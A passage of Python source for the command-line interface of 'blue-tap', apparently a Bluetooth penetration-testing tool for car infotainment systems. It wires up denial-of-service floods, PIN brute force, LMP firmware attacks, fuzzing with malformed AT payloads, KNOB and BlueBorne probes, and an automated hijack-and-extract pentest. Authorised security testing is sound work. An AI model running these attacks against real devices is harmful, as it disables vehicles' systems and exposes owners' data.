    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.dos_runner import run_dos_checks
    from blue_tap.utils.session import log_command

    params = _parse_key_value_overrides(overrides)
    info(f"Running DoS check [bold]{check_id}[/bold] against [bold]{address}[/bold]")
    result = run_dos_checks(
        address,
        hci=hci,
        check_ids=[check_id],
        param_overrides={check_id: params},
        recovery_timeout=recovery_timeout,
    )
    log_command(f"dos_check_{check_id}", result, category="dos", target=address)


@dos.command("pair-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=50, help="Number of pairing attempts")
@click.option("--interval", default=0.5, help="Delay between attempts (seconds)")
def dos_pair_flood(address, count, interval):
    """Flood target with pairing requests."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.dos import PairingFlood
    flood = PairingFlood(address)
    info(f"Starting pairing flood: {count} attempts, {interval}s delay")
    result = flood.flood_pairing_requests(count, interval)
    success(f"Flood complete: {result.get('successful', 0)} paired, "
            f"{result.get('failed', 0)} failed in {result.get('elapsed_seconds', 0):.1f}s "
            f"({result.get('rate_per_second', 0):.1f} req/s)")
    from blue_tap.utils.session import log_command
    log_command("dos_pair_flood", result, category="dos", target=address)


@dos.command("name-flood")
@click.argument("address", required=False, default=None)
@click.option("--length", default=248, help="Device name length")
def dos_name_flood(address, length):
    """Pair with max-length device names (memory exhaustion)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.dos import PairingFlood
    flood = PairingFlood(address)
    info(f"Setting adapter name to {length} bytes and attempting pairing...")
    result = flood.long_name_flood(length)
    status = result.get("status", "unknown")
    if status == "paired":
        success(f"Long name pairing succeeded ({length} bytes) — target accepted oversized name")
    else:
        info(f"Long name pairing result: {status}")
    from blue_tap.utils.session import log_command
    log_command("dos_name_flood", result, category="dos", target=address)


@dos.command("rate-test")
@click.argument("address", required=False, default=None)
@click.option("--attempts", default=10, type=int, help="Number of pairing attempts")
@click.option("--pair-timeout", default=5.0, type=float, help="Timeout per pairing attempt (seconds)")
def dos_rate_test(address, attempts, pair_timeout):
    """Detect rate limiting on pairing attempts."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.dos import PairingFlood
    flood = PairingFlood(address)
    result = flood.detect_rate_limiting(attempts=attempts, pair_timeout=pair_timeout)

    if result.get("rate_limited"):
        warning("Rate limiting detected!")
    else:
        success("No rate limiting detected")
    for k, v in result.items():
        info(f"  {k}: {v}")


@dos.command("pin-brute")
@click.argument("address", required=False, default=None)
@click.option("--start", default=0, help="Start PIN")
@click.option("--end", default=9999, help="End PIN")
@click.option("--delay", default=0.5, help="Delay between attempts")
def dos_pin_brute(address, start, end, delay):
    """Brute-force legacy PIN pairing."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.pin_brute import PINBruteForce
    bf = PINBruteForce(address)
    pin = bf.brute_force(start, end, delay)
    if pin:
        success(f"PIN found: {pin}")
    else:
        warning("PIN not found in range")


@dos.command("l2ping-flood")
@click.argument("address", required=False, default=None)
@click.option("-c", "--count", default=1000, help="Number of pings")
@click.option("-s", "--size", default=600, help="Payload size in bytes")
@click.option("--no-flood", is_flag=True, help="Disable flood mode (slower, shows RTT)")
def dos_l2ping_flood(address, count, size, no_flood):
    """L2CAP echo request flood via l2ping (requires root)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.dos import PairingFlood
    flood = PairingFlood(address)
    mode = "flood" if not no_flood else "normal"
    info(f"Starting L2CAP ping flood: {count} pings, {size}B payload, {mode} mode")
    result = flood.l2ping_flood(count=count, size=size, flood=not no_flood)
    if result.get("error"):
        error(f"L2ping failed: {result['error']}")
    else:
        success(f"L2ping flood complete")
    from blue_tap.utils.session import log_command
    log_command("dos_l2ping_flood", result, category="dos", target=address)


# ---- Protocol-level DoS attacks (L2CAP, SDP, RFCOMM, OBEX, HFP) ----

@dos.command("l2cap-storm")
@click.argument("address", required=False, default=None)
@click.option("--rounds", default=100, help="Number of connect/disconnect cycles")
def dos_l2cap_storm(address, rounds):
    """L2CAP connection storm — rapid connect/disconnect to exhaust resources."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import L2CAPDoS
    info(f"Launching L2CAP connection storm against [bold]{address}[/bold] ({rounds} rounds)")
    attack = L2CAPDoS(address)
    result = attack.config_option_bomb(rounds=rounds)
    _show_dos_result(result)


@dos.command("l2cap-cid-exhaust")
@click.argument("address", required=False, default=None)
@click.option("--count", default=200, help="Number of parallel connections to hold")
def dos_l2cap_cid_exhaust(address, count):
    """L2CAP CID exhaustion — open and hold many parallel connections."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import L2CAPDoS
    info(f"Launching L2CAP CID exhaustion against [bold]{address}[/bold] ({count} connections)")
    attack = L2CAPDoS(address)
    result = attack.cid_exhaustion(count=count)
    _show_dos_result(result)


@dos.command("l2cap-data-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=500, help="Number of packets to send")
@click.option("--size", default=672, help="Payload size per packet")
def dos_l2cap_data_flood(address, count, size):
    """L2CAP data flood — send large malformed SDP requests at max rate."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import L2CAPDoS
    info(f"Launching L2CAP data flood against [bold]{address}[/bold] ({count} packets, {size}B each)")
    attack = L2CAPDoS(address)
    result = attack.echo_amplification(count=count, payload_size=size)
    _show_dos_result(result)


@dos.command("sdp-continuation")
@click.argument("address", required=False, default=None)
@click.option("--connections", default=10, help="Parallel SDP connections")
def dos_sdp_continuation(address, connections):
    """SDP continuation state exhaustion — abandon fragmented SDP sessions."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import SDPDoS
    info(f"Launching SDP continuation exhaustion against [bold]{address}[/bold] ({connections} connections)")
    attack = SDPDoS(address)
    result = attack.continuation_exhaustion(connections=connections)
    _show_dos_result(result)


@dos.command("sdp-des-bomb")
@click.argument("address", required=False, default=None)
@click.option("--depth", default=100, help="DES nesting depth")
def dos_sdp_des_bomb(address, depth):
    """SDP nested DES bomb — recursive data element parsing overload."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import SDPDoS
    info(f"Launching SDP nested DES bomb against [bold]{address}[/bold] (depth={depth})")
    attack = SDPDoS(address)
    result = attack.nested_des_bomb(depth=depth)
    _show_dos_result(result)


@dos.command("rfcomm-sabm-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=60, help="DLCIs to open (max 60)")
def dos_rfcomm_sabm_flood(address, count):
    """RFCOMM SABM flood — open all 60 DLCIs to exhaust DLC pool."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import RFCOMMDoS
    info(f"Launching RFCOMM SABM flood against [bold]{address}[/bold] ({count} DLCIs)")
    attack = RFCOMMDoS(address)
    result = attack.sabm_flood(count=count)
    _show_dos_result(result)


@dos.command("rfcomm-mux-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=500, help="Multiplexer commands to send")
def dos_rfcomm_mux_flood(address, count):
    """RFCOMM multiplexer flood — flood Test commands on DLCI 0."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import RFCOMMDoS
    info(f"Launching RFCOMM mux flood against [bold]{address}[/bold] ({count} Test commands)")
    attack = RFCOMMDoS(address)
    result = attack.mux_command_flood(count=count)
    _show_dos_result(result)


@dos.command("obex-connect-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=20, help="OBEX sessions to open")
def dos_obex_connect_flood(address, count):
    """OBEX session exhaustion — open all OBEX services simultaneously."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import OBEXDoS
    info(f"Launching OBEX connect flood against [bold]{address}[/bold] (max {count} sessions)")
    attack = OBEXDoS(address)
    result = attack.connect_flood(count=count)
    _show_dos_result(result)


@dos.command("hfp-at-flood")
@click.argument("address", required=False, default=None)
@click.option("--channel", default=10, help="HFP RFCOMM channel")
@click.option("--count", default=5000, help="AT commands to send")
def dos_hfp_at_flood(address, channel, count):
    """HFP AT command flood — overwhelm the AT command parser."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import HFPDoS
    info(f"Launching HFP AT flood against [bold]{address}[/bold] (ch={channel}, {count} commands)")
    attack = HFPDoS(address)
    result = attack.at_command_flood(channel=channel, count=count)
    _show_dos_result(result)


@dos.command("hfp-slc-confuse")
@click.argument("address", required=False, default=None)
@click.option("--channel", default=10, help="HFP RFCOMM channel")
def dos_hfp_slc_confuse(address, channel):
    """HFP SLC state machine confusion — out-of-order AT commands."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.protocol_dos import HFPDoS
    info(f"Launching HFP SLC confusion against [bold]{address}[/bold] (ch={channel})")
    attack = HFPDoS(address)
    result = attack.slc_state_confusion(channel=channel)
    _show_dos_result(result)


# ---- LMP-layer DoS attacks (via DarkFirmware) ----

@dos.command("lmp")
@click.argument("target", required=False, default=None)
@click.option("-m", "--method", default="all",
              type=click.Choice(["all", "detach-flood", "switch-storm", "features-flood",
                                 "invalid-opcode", "encryption-toggle", "timing-flood"]),
              help="LMP DoS method (default: all)")
@click.option("-c", "--count", default=500, help="Number of packets to send")
@click.option("--delay", default=0.005, type=float, help="Delay between packets (seconds)")
@click.option("--hci", default="hci1", help="HCI device for DarkFirmware (e.g. hci1 or 1)")
def dos_lmp(target, method, count, delay, hci):
    """LMP-layer DoS via DarkFirmware — below-HCI firmware attacks.

    \b
    Requires DarkFirmware on RTL8761B. These attacks target the Bluetooth
    controller firmware, making them harder to filter than L2CAP-level DoS.

    \b
    Methods:
      detach-flood       Rapid LMP_DETACH with varying error codes
      switch-storm       Rapid LMP_SWITCH_REQ with varying instants
      features-flood     Rapid LMP_FEATURES_REQ to exhaust state
      invalid-opcode     Undefined LMP opcodes (68-126 range)
      encryption-toggle  Alternating START/STOP encryption requests
      timing-flood       Rapid LMP_TIMING_ACCURACY_REQ
    """
    target = resolve_address(target)
    if not target:
        return
    from blue_tap.attack.protocol_dos import LMPDoS

    hci_dev = int(hci.replace("hci", "")) if isinstance(hci, str) and hci.startswith("hci") else int(hci)
    hci_str = f"hci{hci_dev}"
    info(f"Launching LMP DoS ({method}) against [bold]{target}[/bold] "
         f"via {hci_str} ({count} packets, {delay}s delay)")

    attack = LMPDoS(target, hci=hci_str)

    method_map = {
        "detach-flood": attack.detach_flood,
        "switch-storm": attack.switch_storm,
        "features-flood": attack.features_flood,
        "invalid-opcode": attack.invalid_opcode_flood,
        "encryption-toggle": attack.encryption_toggle,
        "timing-flood": attack.timing_flood,
    }

    if method == "all":
        # Run each method with reduced count, show summary table
        per_method_count = max(1, count // 6)
        from rich.table import Table
        summary_table = Table(title="LMP DoS Summary (all methods)")
        summary_table.add_column("Method", style="bold")
        summary_table.add_column("Sent")
        summary_table.add_column("Errors")
        summary_table.add_column("Status")

        all_results = {}
        for m_name, m_func in method_map.items():
            info(f"--- Running {m_name} ({per_method_count} packets) ---")
            r = m_func(count=per_method_count, delay=delay)
            all_results[m_name] = r
            s = r.get("target_status", "unknown")
            style = "red" if s == "possibly_crashed" else "yellow" if s == "survived" else ""
            summary_table.add_row(
                m_name,
                str(r.get("packets_sent", 0)),
                str(r.get("errors", 0)),
                s,
                style=style,
            )

        console.print()
        console.print(summary_table)
        result = {
            "method": "all",
            "sub_results": all_results,
            "target_status": "possibly_crashed" if any(
                r.get("target_status") == "possibly_crashed" for r in all_results.values()
            ) else "survived",
        }
    else:
        func = method_map[method]
        result = func(count=count, delay=delay)

        console.print()
        status = result.get("target_status", "unknown")
        sent = result.get("packets_sent", 0)
        duration = result.get("duration", 0)
        errors = result.get("errors", 0)

        if status == "possibly_crashed":
            success(f"LMP DoS [bold]{method}[/bold]: target may have crashed "
                    f"({sent} packets, {errors} errors, {duration}s)")
        elif status == "survived":
            warning(f"LMP DoS [bold]{method}[/bold]: target survived "
                    f"({sent} packets, {errors} errors, {duration}s)")
        else:
            info(f"LMP DoS [bold]{method}[/bold]: {status} "
                 f"({sent} packets, {errors} errors, {duration}s)")

    from blue_tap.utils.session import log_command
    log_command("dos_lmp", result, category="dos", target=target)


def _show_dos_result(result: dict) -> None:
    """Display DoS attack results."""
    name = result.get("attack", "?")
    target = result.get("target", "?")
    status = result.get("result", "unknown")

    if status == "target_unresponsive":
        success(f"[bold]{name}[/bold] against {target}: target became unresponsive")
    elif status == "success":
        success(f"[bold]{name}[/bold] against {target}: completed")
    else:
        info(f"[bold]{name}[/bold] against {target}: {status}")

    for key in ("packets_sent", "duration_seconds", "notes"):
        val = result.get(key)
        if val:
            info(f"  {key}: {val}")

    from blue_tap.utils.session import log_command
    log_command(f"dos_{name}", result, category="dos", target=result.get("target", ""))


# ============================================================================
# FUZZ - Protocol Fuzzing
# ============================================================================
@main.group()
def fuzz():
    """Protocol fuzzing -- campaign mode, legacy fuzzers, and crash management.

    \b
    Campaign (multi-protocol, dashboard):
      blue-tap fuzz campaign AA:BB:CC:DD:EE:FF
      blue-tap fuzz campaign -p sdp -p rfcomm --duration 30m --capture
      blue-tap fuzz campaign --resume

    \b
    Crash management:
      blue-tap fuzz crashes list
      blue-tap fuzz crashes show 1
      blue-tap fuzz crashes replay 1
      blue-tap fuzz crashes export

    \b
    Legacy single-protocol fuzzers:
      blue-tap fuzz l2cap AA:BB:CC:DD:EE:FF
      blue-tap fuzz rfcomm AA:BB:CC:DD:EE:FF
      blue-tap fuzz at AA:BB:CC:DD:EE:FF
      blue-tap fuzz sdp AA:BB:CC:DD:EE:FF
      blue-tap fuzz bss AA:BB:CC:DD:EE:FF
    """


@fuzz.command("l2cap")
@click.argument("address", required=False, default=None)
@click.option("--psm", default=1, help="L2CAP PSM to fuzz")
@click.option("--count", default=100, help="Number of packets")
@click.option("--mode", default="malformed",
              type=click.Choice(["oversized", "malformed", "null"]))
def fuzz_l2cap(address, psm, count, mode):
    """Fuzz L2CAP protocol."""
    warning(
        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz l2cap' is a legacy command. "
        "Use [bold]blue-tap fuzz run --protocol l2cap[/bold] for the full campaign engine "
        "(coverage-guided, crash management, session persistence)."
    )
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.fuzz import L2CAPFuzzer
    fuzzer = L2CAPFuzzer(address)
    if mode == "oversized":
        result = fuzzer.oversized_mtu(psm)
    elif mode == "null":
        result = fuzzer.null_flood(psm, count)
    else:
        result = fuzzer.malformed_packets(psm, count)
    console.print(f"[bold]Fuzz results:[/bold] {result}")


@fuzz.command("rfcomm")
@click.argument("address", required=False, default=None)
@click.option("--channel", default=1, help="RFCOMM channel")
@click.option("--mode", default="exhaust",
              type=click.Choice(["exhaust", "overflow", "at"]))
def fuzz_rfcomm(address, channel, mode):
    """Fuzz RFCOMM protocol."""
    warning(
        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz rfcomm' is a legacy command. "
        "Use [bold]blue-tap fuzz run --protocol rfcomm[/bold] for the full campaign engine "
        "(coverage-guided, crash management, session persistence)."
    )
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.fuzz import RFCOMMFuzzer
    fuzzer = RFCOMMFuzzer(address)
    if mode == "exhaust":
        result = fuzzer.channel_exhaustion()
    elif mode == "overflow":
        result = fuzzer.large_payload(channel)
    else:
        result = fuzzer.at_fuzz(channel)
    console.print(f"[bold]Fuzz results:[/bold] {result}")


@fuzz.command("at")
@click.argument("address", required=False, default=None)
@click.option("--channel", default=1, help="RFCOMM channel")
@click.option("--patterns", default="long,null,format,unicode,overflow",
              help="Comma-separated: long,null,format,unicode,overflow")
def fuzz_at(address, channel, patterns):
    """AT command fuzzing with malformed inputs."""
    warning(
        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz at' is a legacy command. "
        "Use [bold]blue-tap fuzz run --protocol at-hfp[/bold] (or at-phonebook, at-sms, at-injection) "
        "for the full campaign engine with protocol-aware mutation."
    )
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.fuzz import RFCOMMFuzzer

    # Map keyword names to actual fuzz patterns
    pattern_map = {
        "long": "AT" + "A" * 1024 + "\r\n",
        "null": "AT\x00\x00\r\n",
        "format": "AT%n%n%x%x\r\n",
        "unicode": "AT" + "\u00c4" * 256 + "\r\n",
        "overflow": "AT+" + "B" * 512 + "\r\n",
    }
    pattern_list = []
    for name in patterns.split(","):
        name = name.strip()
        if name in pattern_map:
            pattern_list.append(pattern_map[name])
        else:
            pattern_list.append(name)  # Allow raw patterns too

    fuzzer = RFCOMMFuzzer(address)
    result = fuzzer.at_fuzz(channel, pattern_list)
    console.print(f"[bold]AT fuzz results:[/bold] {result}")


@fuzz.command("sdp")
@click.argument("address", required=False, default=None)
def fuzz_sdp(address):
    """SDP continuation state probe (BlueBorne CVE-2017-0785 vector)."""
    warning(
        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz sdp' is a legacy command. "
        "Use [bold]blue-tap fuzz run --protocol sdp[/bold] for the full campaign engine "
        "with coverage-guided mutation and session persistence."
    )
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.fuzz import SDPFuzzer
    fuzzer = SDPFuzzer(address)
    result = fuzzer.probe_continuation_state()
    if result.get("leak_suspected"):
        warning("Possible SDP info leak detected!")
    console.print(f"[bold]SDP probe results:[/bold] {result}")


@fuzz.command("bss")
@click.argument("address", required=False, default=None)
def fuzz_bss(address):
    """Run Bluetooth Stack Smasher (external tool)."""
    warning(
        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz bss' is a legacy wrapper. "
        "BSS is an external tool — for integrated protocol fuzzing use "
        "[bold]blue-tap fuzz run[/bold] which provides coverage-guided mutation and crash management."
    )
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.fuzz import bss_wrapper
    if not bss_wrapper(address):
        error("BSS not available or failed")


@fuzz.command("lmp")
@click.argument("address", required=False, default=None)
@click.option("-c", "--count", default=1000, type=int, help="Number of fuzz iterations")
@click.option("-m", "--mode", default="all",
              type=click.Choice(["all", "knob", "features", "truncated", "oversized", "io_cap"]),
              help="Fuzz mode")
@click.option("--hci", default="hci1", help="HCI device for DarkFirmware adapter (e.g. hci1 or 1)")
def fuzz_lmp(address, count, mode, hci):
    """LMP protocol fuzzing via DarkFirmware RTL8761B.

    \b
    Sends malformed LMP packets directly at the Link Manager layer,
    bypassing the HCI boundary.  Requires an active connection to the
    target device.

    \b
    Modes: all (comprehensive), knob (CVE-2019-9506), features, truncated,
    oversized, io_cap (IO capability manipulation).
    """
    warning(
        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz lmp' is a legacy command. "
        "Use [bold]blue-tap fuzz run --protocol lmp --strategy coverage_guided[/bold] "
        "for the full campaign engine (17-byte PDUs, response analysis, session persistence)."
    )
    from blue_tap.core.hci_vsc import HCIVSCSocket
    from blue_tap.core.firmware import DarkFirmwareManager
    from blue_tap.fuzz.protocols import lmp as lmp_proto

    hci_dev = int(hci.replace("hci", "")) if isinstance(hci, str) and hci.startswith("hci") else int(hci)
    fw = DarkFirmwareManager()
    if not fw.is_darkfirmware_loaded(f"hci{hci_dev}"):
        error("DarkFirmware not loaded. Run: blue-tap adapter firmware-status")
        return

    # Select fuzz generator based on mode
    generators = {
        "all": lmp_proto.generate_all_lmp_fuzz_cases,
        "knob": lmp_proto.fuzz_enc_key_size,
        "features": lmp_proto.fuzz_features,
        "truncated": lmp_proto.fuzz_truncated,
        "oversized": lmp_proto.fuzz_oversized,
        "io_cap": lmp_proto.fuzz_io_capabilities,
    }
    gen_func = generators.get(mode, lmp_proto.generate_all_lmp_fuzz_cases)

    info(f"Starting LMP fuzzing (mode={mode}, count={count})")

    try:
        with HCIVSCSocket(hci_dev) as vsc:
            sent = 0
            errors = 0
            for label, payload in gen_func():
                if sent >= count:
                    break
                try:
                    ok = vsc.send_lmp(payload)
                    if ok:
                        sent += 1
                    else:
                        errors += 1
                except Exception:
                    errors += 1

                if sent % 100 == 0 and sent > 0:
                    info(f"  Progress: {sent}/{count} sent, {errors} errors")

            result = {"mode": mode, "sent": sent, "errors": errors, "count": count}
            from blue_tap.utils.session import log_command
            log_command("fuzz_lmp", result, category="fuzz", target=address or "")
            success(f"LMP fuzzing complete: {sent} packets sent, {errors} errors")
    except Exception as exc:
        error(f"LMP fuzzing failed: {exc}")


# Register new protocol-aware fuzz commands (campaign dashboard + crash management)
try:
    from blue_tap.fuzz.cli_commands import register_fuzz_commands
    register_fuzz_commands(fuzz)
except ImportError as exc:
    warning(f"Extended fuzz commands unavailable: {exc}")


# ============================================================================
# REPORT - Pentest Report Generation
# ============================================================================
@main.command("report")
@click.argument("dump_dir", required=False, default=None)
@click.option("-f", "--format", "fmt", default="html",
              type=click.Choice(["html", "json"]))
@click.option("-o", "--output", default=None, help="Output file")
def report_cmd(dump_dir, fmt, output):
    """Generate pentest report from the current session.

    \b
    Auto-collects all data from the active session. Pass a directory
    to report from a specific location instead.

    Examples:
      blue-tap report                              # current session
      blue-tap -s mytest report                    # named session
      blue-tap report ./hijack_output              # specific directory
    """
    from blue_tap.report.generator import ReportGenerator
    from blue_tap.utils.session import get_session

    report = ReportGenerator()
    session = get_session()

    if session:
        # Auto-collect from session
        session_data = session.get_all_data()
        info(f"Collecting data from session '{session.name}'...")

        # Feed session data into report
        for entry in session_data.get("scan", []):
            data = entry.get("data", [])
            if isinstance(data, list):
                report.add_scan_results(data)

        for entry in session_data.get("recon", []):
            data = entry.get("data", {})
            if isinstance(data, dict) and data.get("address"):
                report.add_fingerprint(data)
            elif isinstance(data, list):
                report.add_recon_results(data)

        for entry in session_data.get("vuln", []):
            data = entry.get("data", [])
            if isinstance(data, list):
                report.add_vuln_findings(data)

        for entry in session_data.get("attack", []):
            data = entry.get("data", {})
            cmd = entry.get("command", "")
            if isinstance(data, dict):
                # Namespace new attack types so they don't overwrite each other
                if cmd in ("ssp_downgrade", "knob_attack"):
                    report.attack_results[cmd] = data
                elif "phases" in data:
                    report.attack_results.update(data)
                else:
                    report.attack_results[cmd or "attack"] = data

        for entry in session_data.get("data", []):
            data = entry.get("data", {})
            cmd = entry.get("command", "")
            if "pbap" in cmd:
                report.add_pbap_results(data)
            elif "map" in cmd:
                report.add_map_results(data)

        for entry in session_data.get("fuzz", []):
            report.add_fuzz_results(entry.get("data", {}))

        for entry in session_data.get("dos", []):
            report.add_dos_results(entry.get("data", {}))

        for entry in session_data.get("audio", []):
            data = entry.get("data", {})
            report.add_audio_capture(
                data.get("file", ""),
                data.get("duration", 0),
                data.get("description", ""),
            )

        # Add generic command execution evidence from all categories.
        for category_name, entries in session_data.items():
            if not isinstance(entries, list):
                continue
            for entry in entries:
                data = entry.get("data", {})
                if isinstance(data, dict) and data.get("command_path"):
                    status = data.get("status", "unknown")
                    report.add_note(
                        f"Command: {data['command_path']} | "
                        f"Category: {category_name} | Status: {status}"
                    )

        # Pass full session metadata for timeline, scope, and methodology
        report.add_session_metadata(session.metadata)

        # Load structured fuzz data (crash DB, corpus stats, evidence files)
        report.load_fuzz_from_session(session.dir)

        # Add session metadata as a note
        meta = session.metadata
        report.add_note(
            f"Session: {meta.get('name')} | "
            f"Commands: {len(meta.get('commands', []))} | "
            f"Targets: {', '.join(meta.get('targets', []))}"
        )

        out_dir = session.dir
    elif dump_dir:
        report.load_from_directory(dump_dir)
        out_dir = dump_dir
    else:
        error("No session active and no dump directory specified.")
        error("Use: blue-tap -s <session> report  OR  blue-tap report <dir>")
        return

    if fmt == "html":
        out = output or os.path.join(out_dir, "report.html")
        report.generate_html(out)
    else:
        out = output or os.path.join(out_dir, "report.json")
        report.generate_json(out)

    summary = session.summary() if session else {}
    if summary:
        info(f"Session included {summary.get('total_commands', 0)} commands across "
             f"{len(summary.get('categories', []))} categories")


# ============================================================================
# AUTO - Automated Discovery and Attack
# ============================================================================
@main.command("auto")
@click.argument("ivi_mac", required=False, default=None)
@click.option("-d", "--duration", default=30, help="Phone discovery scan duration (seconds)")
@click.option("-o", "--output", default="pentest_output", help="Output directory")
@click.option("-i", "--hci", default="hci0")
@click.option("--fuzz-duration", default=3600, help="Fuzzing duration in seconds (default: 1 hour)")
@click.option("--skip-fuzz", is_flag=True, help="Skip protocol fuzzing phase")
@click.option("--skip-dos", is_flag=True, help="Skip DoS testing phase")
@click.option("--skip-exploit", is_flag=True, help="Skip hijack/exploitation phase")
def auto_cmd(ivi_mac, duration, output, hci, fuzz_duration, skip_fuzz, skip_dos, skip_exploit):
    """Full automated pentest: discovery, fingerprint, recon, vulnscan, exploit, fuzz, DoS, report.

    \b
    Executes a complete 9-phase Bluetooth pentest methodology:
      1. Discovery      — scan for nearby devices, identify paired phone
      2. Fingerprinting  — BT version, chipset, profiles, attack surface
      3. Reconnaissance  — SDP services, RFCOMM channels, L2CAP PSMs
      4. Vuln Assessment — 20+ CVE and configuration checks
      5. Pairing Attacks — SSP downgrade probe, KNOB probe
      6. Exploitation    — hijack (MAC spoof + data extraction)
      7. Protocol Fuzzing— coverage-guided fuzzing (default: 1 hour)
      8. DoS Testing     — L2CAP, SDP, RFCOMM, HFP resilience tests
      9. Report          — HTML + JSON with all findings

    \b
    The coverage-guided fuzzing strategy is used by default — it learns
    from target responses, adapts mutation focus to productive protocol
    fields, and tracks protocol state transitions for maximum coverage.

    \b
    Examples:
      blue-tap auto AA:BB:CC:DD:EE:FF
      blue-tap auto AA:BB:CC:DD:EE:FF --fuzz-duration 7200
      blue-tap auto AA:BB:CC:DD:EE:FF --skip-fuzz --skip-dos
    """
    ivi_mac = resolve_address(ivi_mac, prompt="Select TARGET IVI")
    if not ivi_mac:
        return
    if fuzz_duration <= 0:
        error("--fuzz-duration must be a positive number")
        return
    if duration <= 0:
        error("--duration must be a positive number")
        return
    from blue_tap.attack.auto import AutoPentest
    from blue_tap.utils.session import get_session, log_command

    session = get_session()
    output = session.get_output_dir("auto") if session else output

    auto = AutoPentest(ivi_mac, hci=hci)
    try:
        results = auto.run(
            output_dir=output,
            scan_duration=duration,
            fuzz_duration=fuzz_duration,
            skip_fuzz=skip_fuzz,
            skip_dos=skip_dos,
            skip_exploit=skip_exploit,
        )
        os.makedirs(output, exist_ok=True)
        _save_json(results, os.path.join(output, "auto_results.json"))
        log_command("auto", results, category="attack", target=ivi_mac)
    except KeyboardInterrupt:
        warning("\nInterrupted by user")


# ============================================================================
# RUN - Execute Multiple Commands
# ============================================================================
@main.command("run")
@click.argument("commands", nargs=-1)
@click.option("--playbook", default=None, help="Playbook file (YAML or text, one command per line)")
@click.option("--list", "list_playbooks_flag", is_flag=True, help="List available bundled playbooks")
def run_cmd_seq(commands, playbook, list_playbooks_flag):
    """Execute multiple blue-tap commands in sequence.

    \b
    Each argument is a command string (quote if it has spaces):
      blue-tap -s mytest run "scan classic" "recon fingerprint TARGET" "vulnscan TARGET" "report"

    Use TARGET as a placeholder — you'll be prompted to select a device.

    \b
    Use a playbook file (YAML or plain text):
      blue-tap -s mytest run --playbook quick-recon.yaml
      blue-tap -s mytest run --playbook quick-recon       # searches bundled playbooks

    \b
    List available bundled playbooks:
      blue-tap run --list
    """
    import shlex
    from blue_tap.utils.session import get_session

    # ── List bundled playbooks ────────────────────────────────────────
    if list_playbooks_flag:
        from blue_tap.playbooks import list_playbooks as _list_pb, get_playbook_path
        import yaml

        pb_names = _list_pb()
        if not pb_names:
            info("No bundled playbooks found")
            return

        pb_table = Table(title="[bold cyan]Bundled Playbooks[/bold cyan]",
                         show_lines=True, border_style="dim")
        pb_table.add_column("Playbook", style="bold white")
        pb_table.add_column("Description", style="dim")
        pb_table.add_column("Duration", style="cyan")
        pb_table.add_column("Risk", style="yellow")

        for pb_name in pb_names:
            path = get_playbook_path(pb_name)
            try:
                with open(path) as f:
                    pb = yaml.safe_load(f)
                pb_table.add_row(
                    pb_name.replace(".yaml", ""),
                    pb.get("description", ""),
                    pb.get("duration", ""),
                    pb.get("risk", ""),
                )
            except Exception:
                pb_table.add_row(pb_name, "(error loading)", "", "")

        console.print(pb_table)
        return

    # ── Load playbook ─────────────────────────────────────────────────
    if playbook:
        playbook_path = playbook

        # If no path separator, check bundled playbooks first
        if os.sep not in playbook and not os.path.exists(playbook):
            from blue_tap.playbooks import get_playbook_path
            candidate = get_playbook_path(playbook)
            if os.path.exists(candidate):
                playbook_path = candidate
                info(f"Using bundled playbook: {playbook_path}")

        if not os.path.exists(playbook_path):
            error(f"Playbook not found: {playbook}")
            return

        if playbook_path.endswith((".yaml", ".yml")):
            import yaml
            with open(playbook_path) as f:
                pb_data = yaml.safe_load(f)
            steps = pb_data.get("steps", [])
            if not steps:
                error(f"Playbook has no steps: {playbook_path}")
                return
            info(f"Playbook: [bold]{pb_data.get('name', playbook)}[/bold] - "
                 f"{pb_data.get('description', '')}")
            if pb_data.get("risk"):
                info(f"Risk level: {pb_data['risk']}")
            commands = [step["command"] for step in steps if step.get("command")]
        else:
            with open(playbook_path) as f:
                # Simple format: one command per line (not full YAML)
                commands = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    if not commands:
        error("No commands specified. Usage: blue-tap run \"scan classic\" \"vulnscan TARGET\"")
        return

    # Resolve TARGET / {target} / {hci} placeholders
    target_addr = None
    hci_adapter = "hci0"
    has_target_placeholder = any(
        "TARGET" in cmd.upper() or "{target}" in cmd for cmd in commands
    )
    has_hci_placeholder = any("{hci}" in cmd for cmd in commands)

    if has_target_placeholder:
        target_addr = resolve_address(None, prompt="Select target for workflow")
        if not target_addr:
            error("Target selection cancelled")
            return

    if has_hci_placeholder and not has_target_placeholder:
        # Only prompt for HCI if target wasn't already prompted
        pass  # Default hci0 is fine

    console.rule("[bold cyan]Blue-Tap Workflow", style="cyan")
    info(f"Executing {len(commands)} command(s)")
